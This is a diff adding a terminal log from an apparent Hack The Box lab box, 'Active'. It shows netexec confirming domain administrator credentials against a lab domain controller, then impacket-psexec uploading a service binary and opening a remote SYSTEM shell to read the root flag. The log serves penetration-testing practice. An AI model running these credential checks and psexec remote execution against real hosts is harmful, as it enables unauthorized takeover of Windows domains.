@@ -1,0 +1,26 @@
+┌──(root㉿N1NJ10)-[~/HTB/active]
+└─# netexec smb 10.10.10.100 -u administrator -d active.htb -p N1NJ10
+SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)                                                                                                                                 
+SMB         10.10.10.100    445    DC               [+] active.htb\administrator:N1NJ10 (Pwn3d!)
+
+
+┌──(root㉿N1NJ10)-[~/HTB/active]
+└─# impacket-psexec active.htb/administrator:N1NJ10@10.10.10.100  
+Impacket v0.12.0.dev1+20231130.165011.d370e63 - Copyright 2023 Fortra
+
+[*] Requesting shares on 10.10.10.100.....
+[*] Found writable share ADMIN$
+[*] Uploading file zvaQvBvH.exe
+[*] Opening SVCManager on 10.10.10.100.....
+[*] Creating service ziXs on 10.10.10.100.....
+[*] Starting service ziXs.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32> cd ../../users/administrator/desktop
+ 
+C:\Users\Administrator\Desktop> type root.txt
+N1NJ10N1NJ10N1NJ10N1NJ10N1NJ10N1NJ10
+
+C:\Users\Administrator\Desktop> 
